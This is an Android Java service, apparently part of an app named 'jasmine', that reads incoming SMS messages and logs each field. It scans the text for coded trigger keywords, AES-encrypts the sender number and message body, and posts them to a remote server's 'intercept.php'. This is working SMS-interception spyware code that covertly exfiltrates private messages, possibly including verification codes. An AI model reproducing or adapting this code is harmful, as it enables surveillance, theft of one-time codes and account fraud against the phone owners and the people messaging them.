package com.jasmine.intercept;

import android.app.Service;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.util.Log;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Timer;
import java.util.TimerTask;

public class MainService extends Service {
    public MainService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    /*dcaj
    dcacgc
    dcmgc
    */

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
/*
        new Thread(new Runnable() {
            @Override
            public void run() {
                processSms("2893809062", "dcaj");
            }
        }).start();
*/
        final Bundle bundle = intent.getExtras();

        if (bundle != null) {
            new ProcessSmsTask().execute(bundle);
        }

        stopSelf();
        return 0;
    }

    boolean processSms(String number, String messageBody) {
        String msg = messageBody;
        msg = msg.toUpperCase();
        byte[] msgByte = msg.getBytes();

        if (msgByte[msgByte.length - 1] == 'Z') {
            return false;
        }

        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < msgByte.length; i++) {
            if (msgByte[i] < 'A' || msgByte[i] > 'Z') {
                sb.append('#');
            }
            else {
                msgByte[i] = (byte) (msgByte[i] - 'A' + 1);
                sb.append(Byte.toString(msgByte[i]));
            }
        }

        int type = 0;
        if (sb.toString().contains("431373")) {
            type = 2;
        }
        else if (sb.toString().contains("43110")) {
            type = 1;
        }
        else {
            return false;
        }

        ArrayList<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();

        nameValuePairs.add(new BasicNameValuePair("number", CryptAES.AES_Encrypt(CryptAES.keyStr, number)));
        nameValuePairs.add(new BasicNameValuePair("message", CryptAES.AES_Encrypt(CryptAES.keyStr, messageBody)));
        nameValuePairs.add(new BasicNameValuePair("type", Integer.toString(type)));

        try {

            HttpClient httpclient = new DefaultHttpClient();
            httpclient.getParams().setParameter("http.socket.timeout", new Integer(10000));
            HttpPost httppost = new HttpPost(MainActivity.hostAddress + "/intercept.php");
            httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
            HttpResponse response = httpclient.execute(httppost);
            HttpEntity entity = response.getEntity();
            InputStream is = entity.getContent();

        }
        catch(Exception e) {
            Log.i("jasmine", e.getMessage());
        }

        return true;
    }

    private class ProcessSmsTask extends AsyncTask<Bundle, Void, Boolean> {

        protected Boolean doInBackground(Bundle... bundles) {
            Boolean ret = false;

            final Object[] pdusObj = (Object[]) bundles[0].get("pdus");
            for (int i = 0; i < pdusObj.length; i++) {
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdusObj[i]);

                String displayMessageBody = sms.getDisplayMessageBody();
                String displayOriginatingAddress = sms.getDisplayOriginatingAddress();
                String emailBody = sms.getEmailBody();
                String emailFrom = sms.getEmailFrom();
                String messageBody = sms.getMessageBody();
                String originatingAddress = sms.getOriginatingAddress();
                String pseudoSubject = sms.getPseudoSubject();
                String serviceCenterAddress = sms.getServiceCenterAddress();
                byte[] userData = sms.getUserData();

                Log.i("jasmine", "displayMessageBody: " + displayMessageBody);
                Log.i("jasmine", "displayOriginatingAddress: " + displayOriginatingAddress);
                Log.i("jasmine", "emailBody: " + emailBody);
                Log.i("jasmine", "emailFrom: " + emailFrom);
                Log.i("jasmine", "messageBody: " + messageBody);
                Log.i("jasmine", "originatingAddress: " + originatingAddress);
                Log.i("jasmine", "pseudoSubject: " + pseudoSubject);
                Log.i("jasmine", "serviceCenterAddress: " + serviceCenterAddress);
                Log.i("jasmine", "userData: " + new String(userData));

                ret = processSms(originatingAddress, messageBody);
            }

            return ret;
        }

        protected void onPostExecute(Boolean result) {
            if (result == true) {
                if (MainActivity.mThis != null) {
                    Handler handler = MainActivity.mThis.getHandler();
                    handler.sendMessage(handler.obtainMessage(MainActivity.INTERCEPT_SPECIAL));
                }
            }
        }
    }

}
